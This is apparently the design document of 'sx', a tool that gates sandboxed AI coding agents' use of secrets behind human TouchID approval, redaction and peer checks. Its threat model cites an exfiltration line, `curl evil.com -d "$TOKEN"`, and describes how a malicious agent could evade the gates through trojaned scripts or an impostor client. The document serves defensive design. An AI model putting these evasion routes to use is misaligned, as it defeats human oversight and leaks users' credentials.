# sx — conditioned secret access for sandboxed agents

## Problem

AI coding agents (Claude Code, Codex, …) need secrets to do real work, but the
usual ways of giving them secrets are leaky:

- **Environment variables on the agent process** — the whole agent (and its LLM
  context, transcripts, and logs) can read them. One stray `printenv` or an
  accidental log line ships the secret to the model provider.
- **A `.env` file the agent reads** — requires giving the agent read access to
  the file, which defeats sandboxing it.

We want secrets to be *usable* by programs the agent runs, while being
*unreadable* by the agent itself, with a human in the loop at the moments that
matter.

## The hard truth this design accepts

If a secret is in the environment of a process whose command line the agent
chose, the agent can read it (`printenv`, `curl evil.com -d "$TOKEN"`, …).
"Using" and "reading" are the same operation when the agent writes the code that
receives the secret. So we do **not** claim to stop a determined malicious agent
with arbitrary code execution from exfiltrating a secret it has been allowed to
use. What we *do* provide:

1. The secret value never enters the agent's own process or context.
2. Reading a secret store and using a secret are **gated by a human** — once at
   capture time and again at each use.
3. Casual/accidental leakage (secrets in transcripts, logs, echoed output) is
   blocked by redaction.

For protection against an actively malicious agent, pair this with a sandbox
that restricts network egress (so a read secret still can't leave). That is a
deployment concern, layered on top — not something this tool can do alone.

## Threat model

- **Primary: the careless agent.** Keep secrets out of the LLM transcript, logs,
  scrollback, and disk locations a sandbox can't protect. Fully addressed.
- **Secondary: casual exfiltration.** `printenv`, echoed secrets, obvious
  `curl` to an attacker. Addressed by the per-use approval prompt (the human
  sees the command) plus output redaction.
- **Out of scope alone: a determined malicious agent** that launders the secret
  through an approved-but-trojaned command (e.g. an agent-authored `deploy.sh`).
  Mitigated only when combined with network egress control.

## Architecture: a secrets oracle + an in-sandbox executor

```
┌─────────────────── agent sandbox ─────────────────────────┐
│  agent ──runs──> sx ──execs──> child (gh, curl, …)         │
│                   │ ▲           (inherits sx's sandbox,    │
│   names/argv ─────┘ │ values     gets the secret in env)   │
└─────────────────────┼─────────────────────────────────────┘
                      │ unix socket (gated release of values)
┌─────────────────────┼──── outside the sandbox ────────────┐
│                      ▼                                     │
│   sxd (daemon): reads .env, TouchID gate, holds captured  │
│   secrets in RAM w/ TTL. Does NOT execute anything.       │
└────────────────────────────────────────────────────────────┘
```

Two design rules drive this split:

1. **The store must be outside the sandbox.** A sandbox restriction is inherited
   by child processes, so an `sx` the agent runs *inside* the sandbox cannot be
   granted file access the agent lacks. So the component that reads `.env` /
   keychain (`sxd`) lives **outside**, reachable only over the socket.

2. **Execution must be inside the sandbox.** If the daemon spawned the command,
   that child would run in the daemon's *unsandboxed* context — making `sxd` a
   general "run anything outside the sandbox" oracle, i.e. a privilege-escalation
   primitive. So the daemon never executes. Instead it returns the values
   (gated) to `sx`, and `sx` — already inside the sandbox — injects them and
   execs the command as its own child. The child inherits `sx`'s confinement; it
   is no more powerful than any command the agent could already run, plus one
   env var.

The cost of rule 2: plaintext briefly enters one in-sandbox process (`sx`).
`sx` is therefore the trusted single point that holds a value inside the
sandbox — see "Trusting `sx`" below.

### Components

- **`sx-proto`** — newline-delimited JSON wire types (`Request`/`Response`) and
  the agreed socket path (`$SX_SOCKET`, else `$HOME/.sx/sxd.sock`).
- **`sxd`** — the daemon / secrets oracle. Reads `.env`, gates, holds captured
  secrets in memory with a TTL. Never executes a command.
- **`sx`** — the in-sandbox client. For `run`, it receives the gated values and
  execs the command itself, redacting the values from the child's output.
  Subcommands: `capture`, `clear`, `status`/`list`, `run`.

## Trusting `sx`

Because `sx` briefly holds plaintext inside the sandbox, it is the single point
that could leak a value. "It's open source" protects the *user who runs the real
`sx`*, but does not bind an adversarial agent, which can run a look-alike binary
that connects to the socket, or scrape the real `sx`'s memory. So the trust has
to be **enforced**, not assumed (tracked, not yet implemented):

- **Peer attestation.** Before releasing values, the daemon verifies the socket
  peer *is* the genuine, code-signed `sx`, via the connection's **audit token**
  (`LOCAL_PEERTOKEN`) and `SecCodeCheckValidity` against a signing requirement.
  Audit token, not pid (pids are reuse/race-prone).
- **Hardened runtime, no `get-task-allow`.** Built this way, other same-uid
  processes cannot attach to `sx` or read its memory.

Until both land, the per-use command binding is only as strong as the agent's
honesty: a same-uid impostor could request a secret under a benign-looking
command. The careless-agent and casual-exfil guarantees still hold.

## The double gate

Two independent human checkpoints, both required:

1. **Capture gate (the outer, time-boxed envelope).**
   `sx capture <path> [--ttl N]` asks the daemon to read a `.env`. The daemon
   resolves the path (relative to the caller's cwd), **canonicalizes it**, shows
   the absolute path, and asks the user (TouchID). On approval the values are
   loaded into daemon memory with a TTL. This bounds *which* secrets are live and
   *for how long*.

2. **Per-use gate (the inner check).**
   Each `sx run -s NAME -- cmd …` prompts the user with the secret name(s) and
   the full command before the daemon *releases* the value to `sx`. A capture
   being live does **not** grant silent use — every use is confirmed.

This is deliberately stricter than `sudo`'s timestamp model: capture is an
*added* envelope, not a replacement for per-use confirmation. (The two could be
relaxed independently per secret later — e.g. confirm-each-use for prod tokens,
or a remembered approval keyed on `(secret, argv)` for noisy dev loops.)

## How a secret is used

```
sx run -s GITHUB_TOKEN -- gh pr create --title "..."
```

1. `sx` sends `{secrets:[GITHUB_TOKEN], argv:[gh, pr, create, …]}`.
2. Daemon resolves every name against live captures; unknown name → `Denied`.
3. Daemon prompts the user with names + full command; refusal → `Denied`.
4. Daemon returns `Granted{secrets}` — the values — to `sx`. It spawns nothing.
5. `sx` injects the values and execs `gh …` as **its own child**, in `sx`'s cwd,
   inside the sandbox.
6. `sx` captures the child's stdout/stderr, **redacts** every injected value, and
   relays them. The agent only ever sees the redacted output.

## Backends

- **`.env` (today).** Frictionless: drop a file in a project dir, capture it.
  Plaintext at rest — security rests on the daemon being outside the sandbox.
- **OS keychain (planned).** Via the `keyring` crate (macOS Keychain, Linux
  Secret Service, Windows Credential Manager). Adds encryption at rest and, on
  macOS, a hardware-backed `kSecAccessControl`/TouchID gate on the item itself.

Both sit behind the same daemon and the same double gate.

## Agent integration

- **CLI under Bash.** Both Claude Code and Codex drive a shell; `sx run …` is
  the sanctioned path. The sandbox is configured to block direct `.env` /
  keychain access so `sx` is the only way through.
- **MCP server (planned).** Expose `list_secrets` + `run_with_secrets` so the
  agents get secrets as a first-class tool. Note MCP results land in the model's
  context, so redaction matters there too.

## Peer authentication (implemented)

The daemon never trusts what the client *says* about its identity or location.
On each connection it reads the peer's credentials from the kernel via the
socket:

- **uid** via `getpeereid` — connections from any uid other than the daemon's
  own are refused, so only the owning user can reach their secrets.
- **pid** via `LOCAL_PEERPID` (macOS) / `SO_PEERCRED` (Linux), from which the
  daemon derives the caller's **verified cwd** (`proc_pidinfo` /
  `PROC_PIDVNODEPATHINFO` on macOS, `/proc/<pid>/cwd` on Linux).

`.env` paths are resolved, and `run` children are spawned, against that derived
cwd — the client sends no `cwd` field at all, so it cannot point the daemon at
an arbitrary `.env` or run a child in a directory it doesn't actually occupy.

## Approval gates (implemented)

The gate is an `ApprovalGate` trait so the two checkpoints (capture and
per-use) share one implementation:

- **`TouchIdGate` (default on macOS).** Presents the system authentication
  sheet via LocalAuthentication (`LAPolicyDeviceOwnerAuthentication` — TouchID,
  Apple Watch, or passcode). A thin Objective-C shim (`src/touchid.m`, built by
  `build.rs`) blocks on a dispatch semaphore until the user responds. A user
  *cancel* is a denial; it only falls back to the terminal gate when the policy
  cannot be evaluated at all (no passcode set).
- **`CliGate` (`--cli-gate`, default off-macOS).** Yes/no on the daemon's TTY.
- **`AllowAllGate` (`--no-gate`).** Tests only.

## Known v1 simplifications (tracked, not hidden)

- **`sx` identity is not yet attested.** The plaintext is released to whatever
  same-uid process connects; until audit-token code-sign attestation lands, an
  impostor `sx` could obtain it (see "Trusting `sx`").
- **No per-session capture scoping yet.** Peer auth restricts callers to the
  owning uid, but any process of that uid can use a live capture. Captures
  should additionally be scoped to the session that created them.
- **Fully-interactive commands aren't supported.** `sx run` inherits stdin (so
  piped/redirected input works), but buffers stdout/stderr until the child exits
  so the values can be redacted. A command that must display output *before*
  reading input (a live TUI/pager, an interactive password prompt) won't show it
  until exit. Streaming with incremental redaction is a later enhancement.

## Roadmap

1. ~~Peer-credential auth + cwd derivation.~~ **Done.**
2. ~~TouchID-backed gate on macOS.~~ **Done.**
3. ~~Move execution into the sandboxed client (kill the daemon-as-executor
   escape hatch).~~ **Done.**
4. Attest `sx`'s identity: audit-token code-sign check + hardened runtime.
5. Per-session capture scoping.
6. Keychain backend.
7. Streaming output with incremental redaction.
